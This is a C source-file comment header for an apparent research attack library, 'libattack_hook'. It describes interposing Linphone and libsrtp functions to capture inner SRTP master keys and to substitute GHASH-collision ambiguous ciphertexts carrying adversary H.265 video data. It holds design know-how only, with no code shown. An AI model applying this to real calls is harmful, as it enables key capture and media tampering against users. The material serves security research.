/*
 * libattack_hook — DYLD_INSERT_LIBRARIES hook for the per-packet
 * ambiguous-ciphertext attack (paper §5.4 + Algorithm 2 + Appendix A).
 *
 * Step 2.5e final form:
 *   - interpose `ms_media_stream_sessions_set_srtp_inner_send_key` to
 *     capture the inner master_key + master_salt every time Linphone
 *     hands a fresh inner key to libsrtp (=== RFC 8723 inner-encryption
 *     send-side key rotation point).
 *   - keep a thread-safe sliding window of the last two keys (K_old =
 *     previous, K_new = current). When both are valid the "attack
 *     window" is OPEN — the paper's §4.1 grace buffer.
 *   - interpose `srtp_create` + `srtp_protect`. Tag every srtp_t made
 *     during the inner-setup as a confirmed-inner-send session.
 *   - on inner `srtp_protect` calls, when the attack window is OPEN
 *     AND an adversary NAL fits in sender's outgoing payload:
 *       (i)  rewrite the synthetic plaintext buffer to carry the
 *            adversary H.265 NAL + Filler Data trailer (layout from
 *            adversary_nals.c, identical to sage build_packet_plaintext);
 *       (ii) compute the GHASH-collision ambiguous (ciphertext, tag)
 *            under (K_old, K_new) via attack_crypto.c;
 *       (iii) call the real srtp_protect with the rewritten plaintext
 *             so libsrtp's per-stream bookkeeping (ROC, stats) stays
 *             consistent with the on-wire bytes;
 *       (iv)  overwrite the resulting inner ciphertext + tag with the
 *             pre-computed ambiguous bytes. The outer srtp_protect
 *             will then wrap our wire bytes verbatim.
 *   - configuration via env vars:
 *       ATTACK_HOOK_VIDEO  H.265 raw file to source adversary NALs
 *                          (default: src-video/video_01_main_1920x1440.h265)
 *       ATTACK_HOOK_ARM    "1" to actually substitute; anything else
 *                          (or unset) → observe-only mode. Default OFF.
 *
 * Why interpose this symbol and not the Linphone public callback
 * `linphone_call_cbs_set_send_master_key_changed`: that callback only
 * fires for the OUTER SDES master key (ms2-stream.cpp:1090). The INNER
 * master key for the EKT-distributed RFC 8723 layer is generated by
 * mRNG inside ekt->mSrtpMasterKey and consumed in-process — no public
 * notification exists. The MS2_PUBLIC inner setter is the cleanest
 * boundary that does not require modifying the SDK.
 *
 * SDK contract used:
 *   int ms_media_stream_sessions_set_srtp_inner_send_key(
 *       MSMediaStreamSessions *sessions,
 *       MSCryptoSuite suite,
 *       const uint8_t *key,           // master_key || master_salt
 *       size_t key_length,            // 44 for AEAD-AES-256-GCM
 *       MSSrtpKeySource source);
 *
 * MS_AEAD_AES_256_GCM = 12 (enum position in ms_srtp.h).
 * For that suite: master_key = 32 B, master_salt = 12 B (=
 * SRTP_AEAD_SALT_LEN), total key_length = 44 B.
 */

